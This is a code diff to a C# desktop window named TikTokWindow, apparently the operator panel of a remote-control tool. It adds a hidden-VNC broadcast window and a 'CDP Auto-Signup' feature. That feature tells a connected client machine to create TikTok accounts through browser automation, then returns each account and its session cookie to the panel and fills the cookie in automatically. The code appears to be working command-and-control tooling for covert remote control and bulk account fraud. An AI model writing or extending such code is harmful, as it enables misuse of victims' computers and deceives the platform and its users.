@@ -14,6 +14,7 @@ public partial class TikTokWindow : Window
     private bool _running;
     private int  _sentCount;
     private CancellationTokenSource? _cts;
+    private HvncBroadcastWindow? _broadcastWindow;
 
     public TikTokWindow(TlsServer server, string clientId, string label)
     {
@@ -34,6 +35,14 @@ public partial class TikTokWindow : Window
 
         RbLive.Checked  += (_, _) => TxtIdLabel.Text = "Livestream room ID or URL";
         RbVideo.Checked += (_, _) => TxtIdLabel.Text = "Video URL or ID";
+
+        _server.RegisterHandler(clientId, PacketType.CdpSignupStatus, OnCdpStatus);
+        _server.RegisterHandler(clientId, PacketType.CdpSignupResult, OnCdpResult);
+        Closed += (_, _) =>
+        {
+            _server.UnregisterHandler(clientId, PacketType.CdpSignupStatus);
+            _server.UnregisterHandler(clientId, PacketType.CdpSignupResult);
+        };
     }
 
     // ── Incoming ────────────────────────────────────────────────────────────
@@ -223,4 +232,65 @@ public partial class TikTokWindow : Window
             DragMove();
     }
     private void Close_Click(object s, RoutedEventArgs e) => Close();
+
+    private void BtnBroadcast_Click(object s, RoutedEventArgs e)
+    {
+        if (_broadcastWindow == null || !_broadcastWindow.IsLoaded)
+        {
+            _broadcastWindow = new HvncBroadcastWindow(_server) { Owner = this };
+            _broadcastWindow.Show();
+        }
+        else
+            _broadcastWindow.Activate();
+    }
+
+    // ── CDP Auto-Signup ─────────────────────────────────────────────────────
+
+    private async void BtnCdpSignup_Click(object s, RoutedEventArgs e)
+    {
+        BtnCdpSignup.IsEnabled = false;
+        BtnCdpSignup.Content   = "⏳ Running...";
+        TxtCdpLog.Text         = "";
+        TxtStatus.Text         = "CDP signup running...";
+        await _server.SendToClient(_clientId, new Packet { Type = PacketType.CdpSignupStart });
+    }
+
+    private void OnCdpStatus(Packet pkt)
+    {
+        var d = Newtonsoft.Json.JsonConvert.DeserializeObject<CdpSignupStatusData>(pkt.Data);
+        if (d == null) return;
+        _ = Dispatcher.BeginInvoke(() =>
+        {
+            TxtCdpLog.AppendText($"[·] {d.Message}\n");
+            TxtCdpLog.ScrollToEnd();
+            TxtStatus.Text = d.Message;
+        });
+    }
+
+    private void OnCdpResult(Packet pkt)
+    {
+        var d = Newtonsoft.Json.JsonConvert.DeserializeObject<CdpSignupResultData>(pkt.Data);
+        if (d == null) return;
+        _ = Dispatcher.BeginInvoke(() =>
+        {
+            BtnCdpSignup.IsEnabled = true;
+            BtnCdpSignup.Content   = "🤖 Auto-Signup";
+            if (d.Success)
+            {
+                TxtCdpLog.AppendText($"[✓] Account: {d.Account}\n");
+                if (!string.IsNullOrEmpty(d.Cookie))
+                    TxtCdpLog.AppendText($"[✓] Cookie: {d.Cookie[..Math.Min(d.Cookie.Length, 80)]}...\n");
+                TxtStatus.Text = $"✓ Signup success — {d.Account}";
+                // Auto-fill cookie field if empty
+                if (string.IsNullOrEmpty(TxtCookie.Text) && !string.IsNullOrEmpty(d.Cookie))
+                    TxtCookie.Text = d.Cookie;
+            }
+            else
+            {
+                TxtCdpLog.AppendText($"[✗] {d.Error}\n");
+                TxtStatus.Text = $"✗ {d.Error}";
+            }
+            TxtCdpLog.ScrollToEnd();
+        });
+    }
 }
